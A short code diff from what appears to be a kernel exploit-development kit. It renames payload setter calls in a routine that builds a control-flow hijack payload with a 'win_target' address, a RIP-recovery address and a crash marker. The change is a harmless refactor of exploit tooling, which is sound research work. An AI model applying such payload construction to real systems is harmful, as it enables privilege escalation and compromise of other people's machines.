@@ -101,9 +101,9 @@ public:
         Log("win_target = 0x%lx, rip_recovery = 0x%lx", win_target, rip_recovery);
 
         Payload p(256);
-        p.Set(0, win_target);
-        p.Set(8, rip_recovery);
-        p.Set(16, 0xffffffff41414141); // crash if rip_recovery fails
+        p.SetU64(0, win_target);
+        p.SetU64(8, rip_recovery);
+        p.SetU64(16, 0xffffffff41414141); // crash if rip_recovery fails
         auto buf_addr = xdk_->AllocBuffer(p.GetData(), true);
         Log("buf_addr = 0x%lx", buf_addr);
 
